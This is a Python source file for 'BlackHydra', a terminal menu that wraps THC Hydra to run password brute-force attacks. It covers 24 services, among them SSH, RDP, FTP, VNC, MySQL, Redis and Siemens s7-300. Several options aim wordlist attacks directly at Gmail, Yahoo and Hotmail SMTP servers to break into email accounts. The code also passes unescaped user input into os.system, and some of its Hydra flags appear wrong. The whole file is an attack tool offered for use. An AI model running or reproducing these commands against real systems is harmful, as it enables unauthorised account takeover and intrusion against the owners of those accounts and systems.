#!/usr/bin/python
# -*- coding: utf-8 -*-
# BlackHydra
# Coded by stepbystepexe
# Github: https://github.com/stepbystepexe/BlackHydra

import os, sys, time
from time import sleep

info = """
Name        : BlackHydra
Version     : 1.3 (Update: 11 March 2020, 2:00 PM)
Date        : 01 September 2019
Author      : Nedi Senja
Purpose     : Accidentally encrypted from THC Hydra
              even more simple.
Thankyou    : Allah SWT.
              FR13NDS, & all over
              humans on planet earth
NB          : Humans are not perfect
              as rich as this tool.
              Please report criticism or suggestions
              To - Email: d_q16x@outlook.co.id
                 - WhatsApp: tinyurl.com/wel4alo

[ Use this tool wisely. Thanks ] """

example = """\033[0;41;77;1m[          BlackHydra, My Github: @stepbystepexe         ]\033[0m"""

logo = """
  \033[0;37m█▀▀▀▄ █    █▀▀█ █▀▀▀ █  █   █  █ █   █ █▀▀▄ █▀▀▄ █▀▀█
  \033[0;37m█▀▀▀▄ █    █▀▀█ █    █▀▀▄   █▀▀█ ▀▀█▀▀ █  █ █▀▀▄ █▀▀█
  \033[0;37m▀▀▀▀  ▀▀▀▀ ▀  ▀ ▀▀▀▀ ▀  ▀   ▀  ▀   ▀   ▀▀▀  ▀  ▀ ▀  ▀
"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def play():
    animation = '|/-\\'
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write('\r\033[0m[\033[0;32m●\033[0m] Processing (' + animation[(i % len(animation))]+')')
        sys.stdout.flush()

def loads():
    o = [' .   ',' ..  ',' ... ']
    for i in o:
        print('\r\033[0m[\033[0;93m●\033[0m] Loading'+i,end=''),;sys.stdout.flush();time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

def home():
    os.system('clear')
    os.system('reset')
    sleep(1)
    print()
    print(logo)
    print(example)
    print()
    write("\033[0m[ \033[32mINFO \033[0m] \033[3mBefore starting make sure you have a quota")
    write("         The big one, because the process is quite long\033[0m\n\n")

os.system('clear')
os.system('reset')
sleep(1)
print()
print(logo)
print(example)
print()
print("\033[0m[\033[1;96;2m01\033[0m] \033[1;77mCisco    \033[0m[\033[1;96;2m07\033[0m] \033[1;77mTelnet    \033[0m[\033[1;96;2m13\033[0m] \033[1;77mIMAP     \033[0m[\033[1;96;2m19\033[0m] \033[1;77mRedis  ")
print("\033[0m[\033[1;96;2m02\033[0m] \033[1;77mVNC      \033[0m[\033[1;96;2m08\033[0m] \033[1;77mYahoo     \033[0m[\033[1;96;2m14\033[0m] \033[1;77mSSHkey   \033[0m[\033[1;96;2m20\033[0m] \033[1;77mPywhere")
print("\033[0m[\033[1;96;2m03\033[0m] \033[1;77mFTP      \033[0m[\033[1;96;2m09\033[0m] \033[1;77mHotmail   \033[0m[\033[1;96;2m15\033[0m] \033[1;77mPop3     \033[0m[\033[1;96;2m21\033[0m] \033[1;77mNntp   ")
print("\033[0m[\033[1;96;2m04\033[0m] \033[1;77mGmail    \033[0m[\033[1;96;2m10\033[0m] \033[1;77mRouter    \033[0m[\033[1;96;2m16\033[0m] \033[1;77mRexec    \033[0m[\033[1;96;2m22\033[0m] \033[1;77ms7-300 ")
print("\033[0m[\033[1;96;2m05\033[0m] \033[1;77mSSH      \033[0m[\033[1;96;2m11\033[0m] \033[1;77mRDP       \033[0m[\033[1;96;2m17\033[0m] \033[1;77mXmpp     \033[0m[\033[1;96;2m23\033[0m] \033[1;77mSocks5 ")
print("\033[0m[\033[1;96;2m06\033[0m] \033[1;77mTeam     \033[0m[\033[1;96;2m12\033[0m] \033[1;77mMySQL     \033[0m[\033[1;96;2m18\033[0m] \033[1;77mAdam     \033[0m[\033[1;96;2m24\033[0m] \033[1;77mrLogin ")
print()
print("\033[0m[\033[93;1m&\033[0m] LICENSE")
print("\033[0m[\033[94;1m#\033[0m] Information")
print("\033[0m[\033[92;1m*\033[0m] Update")
print("\033[0m[\033[91;1m-\033[0m] Exit")
print()
option = input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mChoose an option: \033[0m")
if option == '01' or option == '1':
        print()
        play()
        sleep(1)
        home()
        word = input("\x1b[0m[\x1b[106;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[105;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -P %s %s cisco" % (word, iphost))
        print()
        sys.exit(1)
elif option == '02' or option == '2':
        print()
        play()
        sleep(1)
        home()
        word = input("\x1b[0m[\x1b[106;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[105;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
        print()
        sys.exit(1)
elif option == '03' or option == '3':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '04' or option == '4':
        print()
        play()
        sleep(1)
        home()
        email = input("\x1b[0m[\x1b[47;90;1m  Emails  \x1b[0m] ")
        word = input("\x1b[0m[\x1b[45;77;1m Wordlist \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
        print()
        sys.exit(1)
elif option == '05' or option == '5':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '06' or option == '6':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '07' or option == '7':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '08' or option == '8':
        print()
        play()
        sleep(1)
        home()
        email = input("\x1b[0m[\x1b[47;90;1m  Emails  \x1b[0m] ")
        word = input("\x1b[0m[\x1b[45;77;1m Wordlist \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        print()
        sys.exit(1)
elif option == '09' or option == '9':
        print()
        play()
        sleep(1)
        home()
        email = input("\x1b[0m[\x1b[47;90;1m  Emails  \x1b[0m] ")
        word = input("\x1b[0m[\x1b[45;77;1m Wordlist \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
        print()
        sys.exit(1)
elif option == '10':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '11':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '12':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[106;90;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[105;77;1m Wordlist \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
        print()
        sys.exit(1)
elif option == '13':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -p %s %s imap" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '14':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s -s 8676 %s sshkey" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '15':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s pop3" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '16':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s rexec" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '17':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s xmpp" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '18':
        print()
        play()
        sleep(1)
        home()
        word = input("\x1b[0m[\x1b[106;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[105;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -P %s %s adam6500" % (word, iphost))
        print()
        sys.exit(1)
elif option == '19':
        print()
        play()
        sleep(1)
        home()
        word = input("\x1b[0m[\x1b[106;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[105;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -P %s %s redis" % (word, iphost))
        print()
        sys.exit(1)
elif option == '20':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s pcanywhere" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '21':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s nntp" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '22':
        print()
        play()
        sleep(1)
        home()
        word = input("\x1b[0m[\x1b[106;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[105;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -P %s %s s7-300" % (word, iphost))
        print()
        sys.exit(1)
elif option == '23':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s socks5" % (user, word, iphost))
        print()
        sys.exit(1)
elif option == '24':
        print()
        play()
        sleep(1)
        home()
        user = input("\x1b[0m[\x1b[101;77;1m Username \x1b[0m] ")
        word = input("\x1b[0m[\x1b[43;90;1m Wordlist \x1b[0m] ")
        iphost = input("\x1b[0m[\x1b[44;77;1m Hostname \x1b[0m] ")
        print()
        loads()
        print()
        print()
        os.system("hydra -l %s -P %s %s rlogin" % (user, word, iphost))
        print()
        sys.exit(1)
elif option.strip() in '& 25 license'.split():
        print()
        os.system('nano LICENSE')
        print()
        restart()
elif option.strip() in '# 26 info'.split():
        os.system('clear')
        print(example)
        os.system('toilet -f smslant Hydra')
        print(info)
        sleep(1)
        print()
        input('[ Back ]')
        restart()
elif option.strip() in '* 27 update'.split():
        print()
        os.system('git pull origin master')
        print()
        input('\033[0m[ \033[32mBack \033[0m]')
        restart()
elif option.strip() in '- 0 exit'.split():
        print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mExit the program!")
        print()
        sys.exit(1)
else:
        print("\n\033[0m[=\033[1;41;77m Invalid Option \033[0m=]")
        print()
        sleep(1)
        restart()
